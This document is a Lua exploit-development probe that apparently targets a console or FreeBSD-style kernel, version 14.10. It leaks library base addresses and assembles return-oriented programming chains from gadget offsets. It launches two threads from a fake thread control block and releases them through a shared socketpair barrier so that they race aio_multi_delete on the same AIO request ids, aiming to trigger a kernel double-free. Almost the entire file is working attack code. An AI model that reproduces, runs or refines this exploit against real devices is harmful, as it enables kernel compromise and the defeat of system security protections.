-- CRASH_CLASS: HIGH
-- PROBE 555k: shared-barrier dual child race for aio_multi_delete
--
-- 555j confirmed TRUE CONCURRENCY (both children run in parallel).
-- But A=200: separate barrier writes give A ~2μs head start.
-- If delete(32 entries) < 2μs, A finishes before B enters kernel.
--
-- Fix: SINGLE barrier socketpair. Both children read from SAME fd.
-- Main closes write end → EOF broadcast → both wake simultaneously.
-- Kernel wakeup chain marks both runnable in the SAME pass.
-- New barrier per round (close is one-shot).

print("=== PROBE 555k: SHARED BARRIER RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc6   = mk(6)
local sc20  = mk(20)
local sc135 = mk(135)
local sc331 = mk(331)
local sc455 = mk(455)
local sc477 = mk(477)
local sc669 = mk(669)
local sc662 = mk(662)
local sc664 = mk(664)
local sc666 = mk(666)

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local pop_rcx   = eb + uint64(0xE64)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

-- Shared memory
local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
print("shared=" .. q(shared))
local sn = N(shared)

local done_A    = sn + 0x000
local done_B    = sn + 0x004
local ids_addr  = sn + 0x010
local errs_A    = sn + 0x200
local errs_B    = sn + 0x400
local rbuf_A    = sn + 0x500
local rbuf_B    = sn + 0x504
-- +0x508: barrier_rd fd (written by main each round, read by chain)
local bar_fd_addr = sn + 0x508

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Stacks
local ok_sa, stack_A = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local ok_sb, stack_B = pcall(function()
    return sc477(Z, uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local rsp_A = N(stack_A) + 0x100000 - 8
local rsp_B = N(stack_B) + 0x100000 - 8

-- Build chain: sysarch → read(barrier_fd, rbuf, 1) → delete → done → exit
-- The barrier_fd is a FIXED value embedded in the chain.
-- We rebuild chains each round with the new fd.
local function build_chain(rsp_val, barrier_fd, rbuf_ptr, errs_ptr, done_ptr, marker)
    local pos = 0
    local function emit(v) wq(uint64(rsp_val + pos), v); pos = pos + 8 end

    -- sysarch
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- read(barrier_fd, rbuf, 1) — blocks until EOF or data
    emit(pop_rdi); emit(uint64(barrier_fd))
    emit(pop_rsi); emit(uint64(rbuf_ptr))
    emit(pop_rdx); emit(uint64(1))
    emit(pop_rax); emit(uint64(3))  -- sys_read
    emit(fn_addr)

    -- aio_multi_delete(662)
    emit(pop_rdi); emit(uint64(ids_addr))
    emit(pop_rsi); emit(uint64(32))  -- BATCH
    emit(pop_rdx); emit(uint64(errs_ptr))
    emit(pop_rax); emit(uint64(662))
    emit(fn_addr)

    -- done marker
    emit(pop_rax); emit(uint64(marker))
    emit(pop_rdi); emit(uint64(done_ptr))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

local tp_A = memory.alloc(0x40); zero(tp_A, 0x40)
wq(tp_A, bare_ret); wq(tp_A + 0x10, stack_A); wq(tp_A + 0x18, uint64(0x100008))

local tp_B = memory.alloc(0x40); zero(tp_B, 0x40)
wq(tp_B, bare_ret); wq(tp_B + 0x10, stack_B); wq(tp_B + 0x18, uint64(0x100008))

local sv      = memory.alloc(16)
local bar_sv  = memory.alloc(16)
local scratch = memory.alloc(0x1000)
local reqs    = memory.alloc(32 * 0x28 + 16)
local ids_tmp = memory.alloc(32 * 4 + 16)
local cst     = memory.alloc(32 * 4 + 16)
local poll_st = memory.alloc(32 * 4 + 16)

local ROUNDS = 500

print(string.format("Racing %d rounds, batch=32 (shared barrier EOF)\n", ROUNDS))

local total_wins = 0
local a_clean = 0
local b_clean = 0
local mixed = 0
local timeouts = 0

for round = 1, ROUNDS do
    -- Create AIO socketpairs
    local fds_r = {}
    local fds_w = {}
    local ok_sp = true
    for i = 1, 32 do
        local ok, v = pcall(function()
            return sc135(uint64(1), uint64(1), Z, uint64(N(sv)))
        end)
        if ok and N(v) >= 0 then
            fds_r[i] = rd(sv)
            fds_w[i] = rd(sv + 4)
        else
            ok_sp = false; break
        end
    end

    if ok_sp then
        -- Submit AIO
        for i = 0, 31 do
            local base = reqs + i * 0x28
            wq(base + 0x00, Z)
            wq(base + 0x08, uint64(0x1000))
            wq(base + 0x10, uint64(N(scratch)))
            wq(base + 0x18, Z)
            wd(base + 0x20, fds_r[i + 1])
            wd(base + 0x24, 0)
        end
        for i = 0, 31 do wd(ids_tmp + i * 4, 0) end
        pcall(function()
            sc669(uint64(0x1001), uint64(N(reqs)), uint64(32),
                uint64(3), uint64(N(ids_tmp)))
        end)

        -- Cancel + close peers → terminal
        pcall(function()
            sc666(uint64(N(ids_tmp)), uint64(32), uint64(N(cst)))
        end)
        for i = 1, 32 do
            pcall(function() sc6(uint64(fds_w[i])) end)
        end

        -- Poll terminal
        local all_term = false
        for try = 1, 100 do
            pcall(function()
                sc664(uint64(N(ids_tmp)), uint64(32), uint64(N(poll_st)))
            end)
            all_term = true
            for i = 0, 31 do
                local s = rd(poll_st + i * 4)
                if not s or s < 3 then all_term = false; break end
            end
            if all_term then break end
        end

        if all_term then
            -- Create barrier socketpair (new one each round)
            local ok_b, rv_b = pcall(function()
                return sc135(uint64(1), uint64(1), Z, uint64(N(bar_sv)))
            end)
            local bar_rd = rd(bar_sv) or -1
            local bar_wr = rd(bar_sv + 4) or -1

            if bar_rd >= 0 then
                -- Setup shared mem
                for i = 0, 31 do
                    wd(ids_addr + i * 4, rd(ids_tmp + i * 4) or 0)
                    wd(errs_A + i * 4, 0x77777777)
                    wd(errs_B + i * 4, 0x77777777)
                end
                wd(done_A, 0)
                wd(done_B, 0)

                -- Build chains with THIS round's barrier fd
                -- BOTH children read from the SAME bar_rd
                build_chain(rsp_A, bar_rd, rbuf_A, errs_A, done_A, 0xAAAA)
                build_chain(rsp_B, bar_rd, rbuf_B, errs_B, done_B, 0xBBBB)

                -- Launch both children
                pcall(function() sc455(uint64(N(tp_A)), uint64(0x38)) end)
                pcall(function() sc455(uint64(N(tp_B)), uint64(0x38)) end)

                -- Yield to let children block on read()
                for y = 1, 5 do
                    pcall(function() sc331() end)
                end

                -- RELEASE: close write end → EOF broadcast to both readers
                pcall(function() sc6(uint64(bar_wr)) end)

                -- Wait for both
                for y = 1, 30 do
                    pcall(function() sc331() end)
                    local da = rd(done_A) or 0
                    local db = rd(done_B) or 0
                    if da ~= 0 and db ~= 0 then break end
                end

                -- Close read end
                pcall(function() sc6(uint64(bar_rd)) end)

                local da_ok = (rd(done_A) or 0) == 0xAAAA
                local db_ok = (rd(done_B) or 0) == 0xBBBB
                if not da_ok or not db_ok then
                    timeouts = timeouts + 1
                    if timeouts <= 3 then
                        print(string.format("R%d: timeout A=%s B=%s",
                            round, tostring(da_ok), tostring(db_ok)))
                    end
                end

                -- Analyze
                local win_count = 0
                local a_ok = 0
                local b_ok = 0
                for i = 0, 31 do
                    local ea = rd(errs_A + i * 4) or 0x77777777
                    local eb_v = rd(errs_B + i * 4) or 0x77777777
                    if ea == 0 and eb_v == 0 then win_count = win_count + 1 end
                    if ea == 0 then a_ok = a_ok + 1 end
                    if eb_v == 0 then b_ok = b_ok + 1 end
                end

                if win_count > 0 then
                    total_wins = total_wins + win_count
                    print(string.format("R%d: *** DOUBLE-FREE %d/32 ***", round, win_count))
                    if total_wins <= 64 then
                        for i = 0, 3 do
                            print(string.format("  [%d] A=0x%X B=0x%X",
                                i, rd(errs_A + i * 4) or 0, rd(errs_B + i * 4) or 0))
                        end
                    end
                end

                if a_ok == 32 then a_clean = a_clean + 1
                elseif b_ok == 32 then b_clean = b_clean + 1
                elseif a_ok > 0 and b_ok > 0 then mixed = mixed + 1
                end
            end
        end

        -- Cleanup AIO fds
        for i = 1, 32 do
            pcall(function() sc6(uint64(fds_r[i])) end)
        end
    end

    if round % 50 == 0 then
        print(string.format("  r=%d w=%d A=%d B=%d mx=%d to=%d pid=%d",
            round, total_wins, a_clean, b_clean, mixed, timeouts, N(sc20())))
    end
end

print("")
local pid2 = N(sc20())
print(string.format("TOTAL: r=%d wins=%d A=%d B=%d mixed=%d to=%d pid=%d%s",
    ROUNDS, total_wins, a_clean, b_clean, mixed, timeouts, pid2,
    pid2 == pid and " OK" or " CHANGED"))

if total_wins > 0 then
    print(">>> DOUBLE-FREE CONFIRMED ON 14.10 <<<")
elseif mixed > 0 then
    print("INTERLEAVING detected: " .. mixed .. " rounds with split results")
    print("race window exists — may need more rounds or tighter timing")
else
    local winner = a_clean > b_clean and "A" or "B"
    print("no interleaving — " .. winner .. " always wins (" .. a_clean .. "/" .. b_clean .. ")")
    if a_clean > 0 and b_clean > 0 then
        print("both won in different rounds — concurrency present but no overlap on same batch")
    end
end
print("=== 555k DONE ===")
